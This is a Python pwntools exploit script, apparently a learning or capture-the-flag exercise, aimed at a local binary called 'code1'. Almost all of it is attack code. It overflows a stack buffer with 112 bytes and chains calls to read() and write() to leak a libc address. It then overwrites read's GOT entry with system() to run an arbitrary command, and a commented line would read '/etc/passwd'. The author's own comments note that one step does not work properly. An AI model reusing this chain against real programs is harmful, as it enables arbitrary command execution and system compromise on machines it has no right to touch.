#!/usr/bin/python

import sys
import struct
from pwn import *
import time


if len(sys.argv) != 2: 
    print "Usage: $ ", sys.argv[0], "<Command>"
    sys.exit()

command = sys.argv[1]


p = process('./code1')

gdb.attach('code1')
# (buffer_address - ret_stack_addr) * 'a'
a_crap = 'a' * 112

payload = a_crap

# Execute read() function and get the command to be executed. 

read_plt_addr = 0x08048330
pppr_addr = 0x08048549
stdin_fd = 0
#dynamic_addr = 0x08049f14

data_addr = 0x0804a01c

command_size = 100          # Size of .dynamic = 232 bytes(upper limit)

payload += struct.pack('<I', read_plt_addr)     
payload += struct.pack('<I', pppr_addr)         # Return Address of read()
payload += struct.pack('<I', stdin_fd)          # Take user input
payload += struct.pack('<I', data_addr)      # Write into .dynamic section
payload += struct.pack('<I', command_size)      # Command size

# Execute write() function and leak read's address(Using updated GOT entry)

write_plt_addr = 0x08048360
stdout_fd = 1
read_got = 0x0804a00c
leak_size = 4           # Address is 4 bytes and thats all we want.


payload += struct.pack('<I', write_plt_addr)
payload += struct.pack('<I', pppr_addr)
payload += struct.pack('<I', stdout_fd)         # Write address into stdout
payload += struct.pack('<I', read_got)          # Leak read's address
payload += struct.pack('<I', leak_size)         # Leak 4 bytes - an address

# Once you get read's address, execute it to overwrite read's GOT with system()'s address


payload += struct.pack('<I', read_plt_addr)     
payload += struct.pack('<I', pppr_addr)         # Return Address of read()
payload += struct.pack('<I', stdin_fd)          # Take user input
payload += struct.pack('<I', read_got)          # Write system's address into read's GOT
payload += struct.pack('<I', 4)                 # Size of address = 4 bytes




# Call read_plt - essentially calling system() now

payload += struct.pack('<I', read_plt_addr)     # Calling system
payload += struct.pack('<I', 0xbbbb)            # Some crap - we can put exit's address for smooth exit
payload += struct.pack('<I', data_addr)      # This is where the command is located

payload += "\x0a"                                 # Stop reading!


print p.recv(1000)

# Send the payload
p.send(payload)
print "Payload sent!"

# Send command

time.sleep(30)

# This is not happening properly!!!!!
p.send(command)
print "Command ", command, " sent"


# Wait for it send read()'s address
read_addr = p.recv(1000)


# payload += "/bin/cat /etc/passwd" + "\0"        # Execute cat /etc/passwd

read_libc_addr = struct.unpack('<I', read_addr)[0]

print "read()'s libc address = ", hex(read_libc_addr)

# Compute system's address

read_offset = 875264
system_offset = 241056


system_libc_addr = read_libc_addr - read_offset + system_offset     # Find system()'s address


print "system()'s libc address = ", hex(system_libc_addr)

system_libc = struct.pack('<I', system_libc_addr)  

p.send(system_libc)
print "Sent system()'s address!"

p.interactive()


# Write the complete payload into a file "exploit.txt"

f = open('exploit.txt', 'wb')
f.write(payload)
f.close()
